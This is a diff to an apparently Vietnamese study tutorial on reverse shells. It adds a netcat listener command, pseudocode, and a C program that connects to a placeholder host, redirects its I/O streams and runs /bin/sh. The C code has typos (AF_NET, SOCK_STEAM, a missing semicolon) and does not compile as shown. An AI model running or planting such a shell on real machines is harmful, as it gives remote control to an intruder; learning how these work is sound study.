@@ -33,21 +33,88 @@ Attacker Machine -------- shell CLI -------> Server Machine
 <img width="438" height="178" alt="image" src="https://github.com/user-attachments/assets/a582c7ab-504a-4e78-8c19-ef2c0a0f2dae" />
 
 ### Ví dụ:
-Ta biểu diễn chương trình kết nối và gửi shell về máy chủ người dùng qua mã giả tựa c:
+Trước hết, lắng nghe trên máy mình: (attacker machine)
 ```c
-sock = socket();
-connect(sock, 127.0.0.1:4444);
+nc -lvp 4444
+```
 
+Ta biểu diễn chương trình kết nối và gửi shell về máy chủ người dùng qua mã giả tựa C:
+```c
+#
+sock = socket();
+#
+connect(sock, 127.0.0.1:4444);
+#
 dup2(sock, 0);  // stdin  -> socket
 dup2(sock, 1);  // stdout -> socket
 dup2(sock, 2);  // stderr -> socket
-
+#
 execve("/bin/sh", NULL, NULL);
 ```
 * tạo socket - mở pipe kết nối
 * kết nối từ server đến máy chủ user với socket được tạo
 * đưa các quy chuẩn input/output về cho socket; để khi nhận được shell, nó gửi về user machine thay vì chạy trên localhost (server machine)
 * thực hiện `/bin/sh` lấy shell
+
+Code C:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+int main(void) {
+	int sockfd
+	struct sockaddr_in user_addr;
+
+	char *const argv[] = {"/bin/sh", NULL};
+	char *const envp[] = {NULL};
+
+	// create socket
+	sockfd = socket(AF_NET, SOCK_STEAM, 0);
+
+	// build user's address
+	user_addr.sin_family = AF_INET; // ipv4
+	user_addr.sin_port = htons{4444}; // port 4444
+	user_addr.sin_addr.s_addr = inet_addr("x.x.x.x"); // user's machine
+
+	// connect to user's address with created sockfd
+	connect(sockfd, (struct sockaddr *)&user_addr, sizeof(user_addr));
+
+	// redirect 3 data streams to the created socket, so shell spawn on user's machine and not handled locally
+	dup2(sockfd, 0); //stdin
+	dup2(sockfd, 1); //stdout
+	dup2(sockfd, 2); //stderr
+
+	// execute shell, spawn shell on user's machine 
+	execve("/bin/sh", NULL, NULL); 
+
+	close(sockfd);
+
+	return 0;
+}
+```
+
+Vì reverse shell thường là 1 payload, nên kích cỡ file phải nhỏ.
+
+Code asm:
+
+* syscall `socket`, `connect`:
+
+<img width="998" height="63" alt="image" src="https://github.com/user-attachments/assets/8f061027-8fb7-431e-8ad6-08a8bd83b070" />
+
+* syscall `dup2`:
+
+<img width="998" height="64" alt="image" src="https://github.com/user-attachments/assets/96eecb0b-90dc-4d5f-86a8-cce27020af19" />
+
+* syscall `execve`:
+
+<img width="998" height="58" alt="image" src="https://github.com/user-attachments/assets/06a1a40a-95cb-435b-9f13-1f4f831ce46c" />
+
+```asm
+
+```
 ___
 Tài liệu:
 
